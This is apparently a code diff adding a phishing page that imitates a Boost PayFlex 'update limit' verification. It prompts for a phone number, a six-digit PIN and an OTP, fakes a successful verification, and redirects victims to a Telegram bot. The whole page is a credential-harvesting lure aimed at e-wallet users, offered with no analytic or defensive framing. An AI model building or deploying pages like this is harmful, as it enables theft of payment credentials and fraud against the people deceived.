@@ -1,0 +1,125 @@
+# Newboostpayflex-updatelimit-
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verifikasi</title>
+
+<style>
+body{margin:0;font-family:sans-serif;background:#0f172a;color:white;}
+.container{padding:20px;max-width:400px;margin:auto;}
+.card{background:#1e293b;padding:20px;border-radius:15px;margin-top:20px;}
+.page{display:none;}
+.page.active{display:block;}
+.input{width:100%;padding:12px;border-radius:10px;border:none;margin-top:10px;}
+.pin-box{display:flex;justify-content:space-between;margin-top:10px;}
+.pin-box input{width:45px;height:50px;text-align:center;font-size:20px;border-radius:10px;border:none;}
+.btn{width:100%;padding:14px;margin-top:20px;background:#22c55e;border:none;border-radius:10px;color:white;}
+.loading{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:black;justify-content:center;align-items:center;}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<!-- PAGE 1 -->
+<div class="page active" id="p1">
+<div class="card">
+<h3>No Telp</h3>
+<input class="input" placeholder="+60">
+
+<h3>PIN</h3>
+<div class="pin-box" id="pin">
+<input maxlength="1"><input maxlength="1"><input maxlength="1">
+<input maxlength="1"><input maxlength="1"><input maxlength="1">
+</div>
+
+<button class="btn" onclick="next()">Lanjut</button>
+</div>
+</div>
+
+<!-- PAGE 2 -->
+<div class="page" id="p2">
+<div class="card">
+<h3>OTP</h3>
+<div class="pin-box" id="otp">
+<input maxlength="1"><input maxlength="1"><input maxlength="1">
+<input maxlength="1"><input maxlength="1"><input maxlength="1">
+</div>
+
+<p id="timer">60</p>
+
+<button class="btn" onclick="proses()">Verifikasi</button>
+</div>
+</div>
+
+<!-- PAGE 3 -->
+<div class="page" id="p3">
+<div class="card" style="text-align:center;">
+<h2>✅ Berhasil</h2>
+<p id="time"></p>
+<button class="btn" onclick="goTelegram()">Lanjut ke Telegram</button>
+</div>
+</div>
+
+</div>
+
+<div class="loading" id="load">
+<p>Loading...</p>
+</div>
+
+<script>
+// auto pindah
+function setup(id){
+let inputs=document.querySelectorAll("#"+id+" input");
+inputs.forEach((inp,i)=>{
+inp.oninput=()=>{
+inp.value=inp.value.replace(/[^0-9]/g,'');
+if(inp.value && i<5) inputs[i+1].focus();
+};
+});
+}
+setup("pin");
+setup("otp");
+
+// pindah page
+function show(id){
+document.querySelectorAll(".page").forEach(p=>p.classList.remove("active"));
+document.getElementById(id).classList.add("active");
+}
+
+function next(){
+show("p2");
+startTimer();
+}
+
+// timer
+function startTimer(){
+let t=60;
+let el=document.getElementById("timer");
+let i=setInterval(()=>{
+t--;
+el.innerText=t;
+if(t<=0) clearInterval(i);
+},1000);
+}
+
+// proses
+function proses(){
+document.getElementById("load").style.display="flex";
+setTimeout(()=>{
+document.getElementById("load").style.display="none";
+show("p3");
+document.getElementById("time").innerText=new Date().toLocaleString();
+},1500);
+}
+
+// telegram
+function goTelegram(){
+window.location.href="https://t.me/BoostpayflexBot";
+}
+</script>
+
+</body>
+  </html>
